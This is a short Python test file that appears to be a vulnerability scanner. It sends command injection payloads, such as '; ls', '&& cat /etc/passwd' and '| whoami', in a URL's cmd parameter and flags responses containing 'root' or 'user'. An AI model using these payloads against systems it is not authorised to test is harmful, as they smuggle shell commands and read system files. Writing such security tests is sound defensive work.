# tests/test_command_injection.py

import requests

# Define payloads for command injection tests
command_injection_payloads = ["; ls", "&& cat /etc/passwd", "| whoami"]

def test_command_injection(url):
    results = []
    for payload in command_injection_payloads:
        target = f"{url}?cmd={payload}"
        response = requests.get(target)
        if "root" in response.text or "user" in response.text:
            results.append({"payload": payload, "vulnerable": True, "reason": "Command execution detected in response."})
    return results
